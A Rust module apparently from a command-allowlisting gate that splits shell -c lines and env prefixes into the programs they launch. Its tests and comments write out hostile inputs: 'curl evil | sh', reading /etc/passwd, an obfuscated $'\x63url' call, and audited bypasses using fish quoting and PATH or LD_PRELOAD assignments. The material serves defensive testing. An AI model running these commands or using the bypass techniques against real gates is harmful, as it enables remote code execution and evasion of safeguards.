//! The programs a shell `-c` line or an `env` prefix launches, each to be gated.
//! Measured 2026-10-12: `sh -c "curl evil"` was allowed with `sh` listed, `curl` not.
//! A script or unreadable line is [`Launched::Opaque`](crate::interpreter::Launched::Opaque); code interpreters are not expanded.
//! Only Bourne/POSIX shells are split; fish, csh and tcsh are unanalyzable.
//! A leading `PATH=…` (or any key of `env_keys`) in a `-c` segment or an `env` prefix is opaque (H1-2, 2026-10-30).

/// What inspecting one argv tells the command gate.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Launched {
    /// `argv[0]` is an ordinary program; only it runs.
    Program,
    /// `argv[0]` launches these further programs (a parsed `sh -c` line, or an
    /// `env PROG` tail). Each must also be allowlisted.
    Via(Vec<String>),
    /// `argv[0]` runs a script, or a `-c` line the parser cannot decompose, so
    /// the real programs are invisible. Fail closed.
    Opaque,
}

/// Bound on nested interpreters (`sh -c 'bash -c "env sh -c …"'`): deep enough
/// for anything real, and a hostile nesting fails closed rather than recurses.
const MAX_DEPTH: usize = 8;

/// The program names `command`/`args` authorise to run. Shells and `env` are
/// expanded; everything else is a plain [`Launched::Program`].
pub fn classify(command: &str, args: &[String]) -> Launched {
    classify_depth(command, args, 0)
}

fn classify_depth(command: &str, args: &[String], depth: usize) -> Launched {
    if depth > MAX_DEPTH {
        return Launched::Opaque;
    }
    let name = basename(command);
    if name == "env" {
        classify_env(args, depth)
    } else if is_bourne_shell(name) {
        classify_shell(args, depth)
    } else if is_foreign_shell(name) {
        classify_foreign_shell(args)
    } else {
        Launched::Program
    }
}

/// Shells whose `-c` line is split with Bourne/POSIX quoting (single quotes
/// literal, `tokenize_segments`). Measured 2026-10-16: these all run the measured bypass
/// line as the tokenizer reads it, so the split is sound.
fn is_bourne_shell(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash" | "dash" | "zsh" | "ksh" | "mksh" | "ash" | "rbash"
    )
}

/// Shells that take `-c` but do NOT use Bourne quoting, so `tokenize_segments`
/// cannot split them soundly (fish reads `\'` as an escaped quote inside
/// `'…'`, csh/tcsh have their own grammar). The gate has no grammar for them,
/// so any argument form is unanalyzable; only a bare, inert invocation passes.
fn is_foreign_shell(name: &str) -> bool {
    matches!(name, "fish" | "csh" | "tcsh")
}

/// A shell reserved word or code-running builtin in command position: the line
/// is a compound script, not a flat list of commands, so decomposition would
/// miss what runs. Fail closed instead of naming a keyword as a program.
fn is_compound_word(w: &str) -> bool {
    matches!(
        w,
        "if" | "then"
            | "elif"
            | "else"
            | "fi"
            | "for"
            | "while"
            | "until"
            | "do"
            | "done"
            | "case"
            | "esac"
            | "select"
            | "function"
            | "time"
            | "coproc"
            | "eval"
            | "exec"
            | "source"
            | "trap"
            | "."
            | "!"
    )
}

/// `env [-i] [-u NAME]… [NAME=val]… [--] [PROG [args]]`: strip to PROG and recurse.
/// No PROG: `env` only prints. `-S` re-splits a string into an argv the gate cannot
/// read, so it is `Opaque`, like any flag not modelled here.
fn classify_env(args: &[String], depth: usize) -> Launched {
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        if a == "--" {
            i += 1;
            break;
        }
        if a == "-i" || a == "--ignore-environment" || a == "-0" || a == "--null" {
            i += 1;
            continue;
        }
        if a == "-u" || a == "--unset" || a == "-C" || a == "--chdir" {
            i += 2; // these take a value
            continue;
        }
        if a == "-S" || a.starts_with("-S") || a.starts_with("--split-string") {
            return Launched::Opaque;
        }
        if a.starts_with('-') {
            return Launched::Opaque; // an env flag we do not model: fail closed
        }
        if is_assignment(a) {
            if assignment_chooses_the_program(a) {
                return Launched::Opaque;
            }
            i += 1;
            continue;
        }
        break; // first bare, non-assignment token is the program
    }
    let Some(prog) = args.get(i) else {
        return Launched::Program;
    };
    match classify_depth(prog, &args[i + 1..], depth + 1) {
        Launched::Program => Launched::Via(vec![prog.clone()]),
        Launched::Via(mut p) => {
            p.insert(0, prog.clone());
            Launched::Via(p)
        }
        Launched::Opaque => Launched::Opaque,
    }
}

/// A shell's `-c <line>` is parsed and each sub-command submitted to the gate;
/// a bare shell (no args) is inert with a null stdin; any other form hands the
/// shell a script the gate cannot read.
fn classify_shell(args: &[String], depth: usize) -> Launched {
    // The command string follows the first short-flag cluster carrying `c`
    // (`-c`, `-lc`, `-ic`); interpreters accept combined flags.
    let mut i = 0;
    let mut line_idx = None;
    while i < args.len() {
        let a = &args[i];
        if a == "--" || a == "-" || !a.starts_with('-') {
            break;
        }
        if !a.starts_with("--") && a[1..].contains('c') {
            line_idx = Some(i + 1);
            break;
        }
        i += 1;
    }
    match line_idx {
        None => {
            if args.is_empty() {
                Launched::Program
            } else {
                Launched::Opaque
            }
        }
        Some(idx) => match args.get(idx) {
            None => Launched::Opaque,
            Some(line) => match shell_line_programs(line, depth + 1) {
                Ok(progs) => Launched::Via(progs),
                Err(()) => Launched::Opaque,
            },
        },
    }
}

/// A non-Bourne shell (`fish`, `csh`, `tcsh`): a bare invocation on a null
/// stdin is inert (`Program`); any argument form (a `-c` line, a script) is
/// split by a grammar the gate does not implement, so it is `Opaque`. The bypass:
/// treating its `-c` line with Bourne quoting let a hidden command through.
fn classify_foreign_shell(args: &[String]) -> Launched {
    if args.is_empty() {
        Launched::Program
    } else {
        Launched::Opaque
    }
}

/// One program per command of a `-c` line, split on `;`, `&&`, `||`, `|`, `&`, newline.
/// `Err` on expansion, substitution, redirection, grouping or a compound keyword:
/// what those run is unknown, so the caller fails closed. `Err` too when a
/// leading assignment names a variable that chooses the program (H1-2).
fn shell_line_programs(line: &str, depth: usize) -> Result<Vec<String>, ()> {
    if depth > MAX_DEPTH {
        return Err(());
    }
    let mut out = Vec::new();
    for seg in tokenize_segments(line)? {
        let mut it = seg.into_iter().peekable();
        while it.peek().is_some_and(|w| is_assignment(w)) {
            let w = it.next().unwrap_or_default();
            if assignment_chooses_the_program(&w) {
                return Err(());
            }
        }
        let Some(prog) = it.next() else {
            continue; // a segment of assignments only, or empty
        };
        if is_compound_word(&prog) {
            return Err(());
        }
        let rest: Vec<String> = it.collect();
        match classify_depth(&prog, &rest, depth + 1) {
            Launched::Program => out.push(prog),
            Launched::Via(p) => {
                out.push(prog);
                out.extend(p);
            }
            Launched::Opaque => return Err(()),
        }
    }
    Ok(out)
}

/// Split a shell line into command segments of words, quotes honoured. `Err`
/// on substitution (`$`, backtick), subshell or group (`()`,`{}`), redirection
/// (`<`,`>`) or an unterminated quote.
fn tokenize_segments(line: &str) -> Result<Vec<Vec<String>>, ()> {
    use std::mem::take;
    let mut segments: Vec<Vec<String>> = Vec::new();
    let mut cur: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut in_word = false;
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_word = true;
                loop {
                    match chars.next() {
                        None => return Err(()),
                        Some('\'') => break,
                        Some(q) => word.push(q),
                    }
                }
            }
            '"' => {
                in_word = true;
                loop {
                    match chars.next() {
                        None => return Err(()),
                        Some('"') => break,
                        Some('$') | Some('`') => return Err(()),
                        Some('\\') => match chars.next() {
                            None => return Err(()),
                            Some(e @ ('"' | '\\' | '$' | '`')) => word.push(e),
                            Some(e) => {
                                word.push('\\');
                                word.push(e);
                            }
                        },
                        Some(q) => word.push(q),
                    }
                }
            }
            '\\' => match chars.next() {
                None => return Err(()),
                Some(e) => {
                    in_word = true;
                    word.push(e);
                }
            },
            '$' | '`' | '(' | ')' | '<' | '>' | '{' | '}' => return Err(()),
            ' ' | '\t' => {
                if in_word {
                    cur.push(take(&mut word));
                    in_word = false;
                }
            }
            ';' | '\n' => {
                if in_word {
                    cur.push(take(&mut word));
                    in_word = false;
                }
                if !cur.is_empty() {
                    segments.push(take(&mut cur));
                }
            }
            '&' => {
                if chars.peek() == Some(&'&') {
                    chars.next();
                }
                if in_word {
                    cur.push(take(&mut word));
                    in_word = false;
                }
                if !cur.is_empty() {
                    segments.push(take(&mut cur));
                }
            }
            '|' => {
                if chars.peek() == Some(&'|') || chars.peek() == Some(&'&') {
                    chars.next();
                }
                if in_word {
                    cur.push(take(&mut word));
                    in_word = false;
                }
                if !cur.is_empty() {
                    segments.push(take(&mut cur));
                }
            }
            other => {
                in_word = true;
                word.push(other);
            }
        }
    }
    if in_word {
        cur.push(word);
    }
    if !cur.is_empty() {
        segments.push(cur);
    }
    Ok(segments)
}

/// `NAME=val` with a shell-identifier name, no path separator before the `=`.
/// `NAME=value` on a key the loader, the shell or a language runtime consults
/// for what executes (`PATH`, `LD_PRELOAD`, `BASH_ENV`, `PYTHONPATH`…).
/// Audit of 2026-10-30, H1-2: `sh -c 'PATH=/tmp/x cat secret'` passed the gate
/// as `cat` while sh ran `/tmp/x/cat`. The gate cannot follow such a line, so
/// the caller fails closed, as `env_keys::check_caller_env` does on `env`.
fn assignment_chooses_the_program(w: &str) -> bool {
    w.split_once('=')
        .is_some_and(|(name, _)| crate::env_keys::is_program_choosing(name))
}

fn is_assignment(w: &str) -> bool {
    match w.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && name
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

fn basename(cmd: &str) -> &str {
    cmd.rsplit('/').next().unwrap_or(cmd)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn a(args: &[&str]) -> Vec<String> {
        args.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn a_plain_program_is_itself() {
        assert_eq!(classify("cargo", &a(&["test"])), Launched::Program);
        assert_eq!(
            classify("git", &a(&["-c", "x=y", "log"])),
            Launched::Program
        );
    }

    /// A code interpreter is a plain program at the gate: allowlisting it is the
    /// decision to run its code; confining that code is the sandbox's job. So
    /// `python3 -c` and `python3 script.py` are both `Program`, not `Opaque`.
    #[test]
    fn a_code_interpreter_is_not_expanded() {
        assert_eq!(
            classify("python3", &a(&["-c", "import os"])),
            Launched::Program
        );
        assert_eq!(classify("python3", &a(&["script.py"])), Launched::Program);
        assert_eq!(classify("node", &a(&["-e", "1"])), Launched::Program);
        assert_eq!(
            classify("/usr/bin/perl", &a(&["-e", "1"])),
            Launched::Program
        );
    }

    #[test]
    fn a_shell_dash_c_line_lists_each_sub_command() {
        assert_eq!(
            classify("bash", &a(&["-c", "cat f; curl evil"])),
            Launched::Via(vec!["cat".into(), "curl".into()])
        );
        assert_eq!(
            classify("sh", &a(&["-c", "curl evil | sh"])),
            Launched::Via(vec!["curl".into(), "sh".into()])
        );
        // The command string follows a combined flag cluster.
        assert_eq!(
            classify("bash", &a(&["-lc", "wget x"])),
            Launched::Via(vec!["wget".into()])
        );
        // A `;` inside quotes is literal, not a separator.
        assert_eq!(
            classify("sh", &a(&["-c", "echo 'a; b'"])),
            Launched::Via(vec!["echo".into()])
        );
    }

    #[test]
    fn env_strips_to_the_real_program_and_recurses() {
        assert_eq!(
            classify("env", &a(&["FOO=1", "sh", "-c", "curl evil"])),
            Launched::Via(vec!["sh".into(), "curl".into()])
        );
        assert_eq!(
            classify("env", &a(&["cat", "f"])),
            Launched::Via(vec!["cat".into()])
        );
        assert_eq!(classify("env", &a(&[])), Launched::Program);
        assert_eq!(classify("env", &a(&["-S", "sh -c 'x'"])), Launched::Opaque);
    }

    #[test]
    fn an_opaque_invocation_fails_closed() {
        assert_eq!(classify("bash", &a(&["script.sh"])), Launched::Opaque);
        assert_eq!(classify("sh", &a(&["-x", "/work/x.sh"])), Launched::Opaque);
        // substitution, subshell, redirection: unreadable.
        assert_eq!(classify("sh", &a(&["-c", "$(id) x"])), Launched::Opaque);
        assert_eq!(
            classify("sh", &a(&["-c", "cat </etc/passwd"])),
            Launched::Opaque
        );
        assert_eq!(classify("bash", &a(&["-c", "`id`"])), Launched::Opaque);
        // compound control flow: not a flat list of commands.
        assert_eq!(
            classify("sh", &a(&["-c", "while :; do curl evil; done"])),
            Launched::Opaque
        );
        assert_eq!(
            classify("bash", &a(&["-c", "trap '' PIPE; yes"])),
            Launched::Opaque
        );
    }

    #[test]
    fn a_bare_shell_is_inert() {
        assert_eq!(classify("sh", &a(&[])), Launched::Program);
        assert_eq!(classify("bash", &a(&[])), Launched::Program);
    }

    #[test]
    fn a_nested_shell_is_expanded() {
        assert_eq!(
            classify("sh", &a(&["-c", "bash -c 'curl evil'"])),
            Launched::Via(vec!["bash".into(), "curl".into()])
        );
    }

    /// SECURITY: a non-Bourne shell's `-c` line is split by its own
    /// grammar, not Bourne's. fish reads `\'` as an escaped quote inside `'…'`
    /// (measured 2026-10-16: `fish -c "echo 'a\\' '; <cmd>; echo ''\\'"` ran the
    /// middle command, sh/bash/zsh/ksh/mksh did not), so the Bourne tokenizer's
    /// split is wrong for it. The gate cannot decompose it with certainty: fail
    /// closed rather than name the wrong programs.
    #[test]
    fn a_non_bourne_shell_dash_c_is_opaque() {
        // The exact bypass line (middle command neutered to a placeholder).
        assert_eq!(
            classify("fish", &a(&["-c", "echo 'a\\' '; curl evil; echo ''\\'"])),
            Launched::Opaque
        );
        for sh in ["fish", "csh", "tcsh"] {
            assert_eq!(
                classify(sh, &a(&["-c", "cat f; curl evil"])),
                Launched::Opaque,
                "{sh} -c must fail closed, its quoting is not Bourne"
            );
            // Even an apparently innocent line: we have no grammar for it.
            assert_eq!(
                classify(sh, &a(&["-c", "echo hi"])),
                Launched::Opaque,
                "{sh} -c is unanalyzable regardless of the line"
            );
            // A script path, like any non-Bourne shell argument form.
            assert_eq!(classify(sh, &a(&["x.fish"])), Launched::Opaque);
        }
    }

    /// A bare non-Bourne shell (no args) is inert on a null stdin, like a bare
    /// Bourne shell: nothing runs, so it stays `Program`.
    #[test]
    fn a_bare_non_bourne_shell_is_inert() {
        for sh in ["fish", "csh", "tcsh"] {
            assert_eq!(classify(sh, &a(&[])), Launched::Program, "{sh}");
        }
    }

    /// A non-Bourne shell reached through a Bourne `-c` line or through `env`
    /// still fails closed: the outer split is Bourne, the inner shell is not.
    #[test]
    fn a_nested_non_bourne_shell_fails_closed() {
        assert_eq!(
            classify("sh", &a(&["-c", "fish -c 'curl evil'"])),
            Launched::Opaque
        );
        assert_eq!(
            classify("env", &a(&["fish", "-c", "curl evil"])),
            Launched::Opaque
        );
    }

    /// Bourne and POSIX shells keep their faithful split (sh/bash/dash/zsh/ksh/
    /// mksh/ash/rbash): measured 2026-10-16, these run the bypass line as the
    /// tokenizer reads it (only `echo`), so classifying it `Via([echo])` is
    /// sound, not a bypass.
    #[test]
    fn posix_shells_still_split_faithfully() {
        for sh in ["sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "rbash"] {
            assert_eq!(
                classify(sh, &a(&["-c", "echo 'a\\' '; curl evil; echo ''\\'"])),
                Launched::Via(vec!["echo".into()]),
                "{sh} is POSIX: its single quotes are literal"
            );
        }
    }

    /// ANSI-C quoting (`$'…'`) and heredocs are already unreadable (the `$` and
    /// `<` bail in `tokenize_segments`); asserted here as bypass variants so a
    /// future relaxation of the tokenizer cannot reopen them silently.
    #[test]
    fn ansi_c_quoting_and_heredocs_are_opaque() {
        assert_eq!(
            classify("bash", &a(&["-c", "$'\\x63url' evil"])),
            Launched::Opaque
        );
        assert_eq!(
            classify("zsh", &a(&["-c", "$'\\x63url' evil"])),
            Launched::Opaque
        );
        assert_eq!(
            classify("bash", &a(&["-c", "cat <<EOF\nx\nEOF"])),
            Launched::Opaque
        );
    }

    /// Audit of 2026-10-30, H1-2. `PATH=/tmp/x cat secret` inside a `-c` line:
    /// the gate skipped the assignment and approved `cat`; sh applied the
    /// assignment and ran `/tmp/x/cat`. Same with `env PATH=… cat`. A skipped
    /// assignment on a key that chooses the program makes the line opaque.
    #[test]
    fn an_inline_assignment_that_chooses_the_program_is_opaque() {
        for key in ["PATH", "LD_PRELOAD", "BASH_ENV", "PYTHONPATH", "ld_preload"] {
            assert_eq!(
                classify("sh", &a(&["-c", &format!("{key}=/tmp/x cat secret")])),
                Launched::Opaque,
                "sh -c '{key}=… cat' must fail closed"
            );
            assert_eq!(
                classify("env", &a(&[&format!("{key}=/tmp/x"), "cat", "secret"])),
                Launched::Opaque,
                "env {key}=… cat must fail closed"
            );
            assert_eq!(
                classify(
                    "sh",
                    &a(&["-c", &format!("echo a; {key}=/tmp/x cat secret")])
                ),
                Launched::Opaque,
                "a later segment with {key}=… must fail closed"
            );
        }
        // An ordinary application variable keeps the faithful split.
        assert_eq!(
            classify("sh", &a(&["-c", "FOO=1 RUST_LOG=debug cat f"])),
            Launched::Via(vec!["cat".into()])
        );
        assert_eq!(
            classify("env", &a(&["FOO=1", "cat", "f"])),
            Launched::Via(vec!["cat".into()])
        );
    }
}
